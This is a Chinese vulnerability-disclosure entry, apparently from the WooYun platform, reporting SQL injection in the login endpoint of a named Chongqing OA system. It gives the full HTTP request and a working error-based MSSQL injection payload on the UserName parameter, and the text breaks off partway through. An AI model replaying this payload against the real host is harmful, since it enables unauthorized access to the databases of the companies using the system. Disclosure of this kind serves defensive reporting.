wybug_title: 重庆猫扑OA登陆存在sql注入
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-05-22：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-07-06：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： http://oa.oooa.cn/Login.aspx  登陆存在post注入  影响重庆30多家企业 详细说明：  

POST /inc/loginAjax.aspx HTTP/1.1Host: oa.oooa.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://oa.oooa.cn/Login.aspxContent-Length: 266Cookie: safedog-flow-item=4093F074FD266344424A648DA8EC70B0; bbxmax_guest=36138a44b0e74844ba1628babba0aa26; ASP.NET_SessionId=rmojpk3jngkbbzeoe2qfpm45Connection: keep-alivePragma: no-cacheCache-Control: no-cacheUserName=test&Pwd=test&Os=Windows&参数UserName存在sql注入Parameter: UserName (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: UserName=test' AND 9709=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(122)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (9709=9709) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(98)+CHAR(113))) AND 'jcmW'='jcmW&Pwd=test&Os=Windows&Browser=Firefoxx    Type: UNION query    Title: Generic UNION query (NULL) -
